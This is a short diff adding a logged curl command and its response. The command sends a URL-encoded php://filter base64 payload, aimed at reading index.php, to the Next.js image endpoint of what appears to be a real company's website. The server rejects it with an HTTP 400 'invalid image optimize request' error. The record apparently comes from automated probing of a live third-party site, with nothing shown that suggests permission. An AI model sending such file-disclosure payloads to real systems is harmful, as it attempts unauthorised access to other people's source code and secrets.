@@ -1,0 +1,11 @@
+# command: timeout 20 curl -s -m 18 -o - -w '\nHTTP_STATUS:%{http_code}' 'https://www.infinitycapital.bh/_next/image?w=php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dindex.php'
+# exit_code: 0
+# ---
+
+Bad request
+
+INVALID_IMAGE_OPTIMIZE_REQUEST
+
+bom1::jn2rm-1790749370275-e0ab4a819094
+
+HTTP_STATUS:400
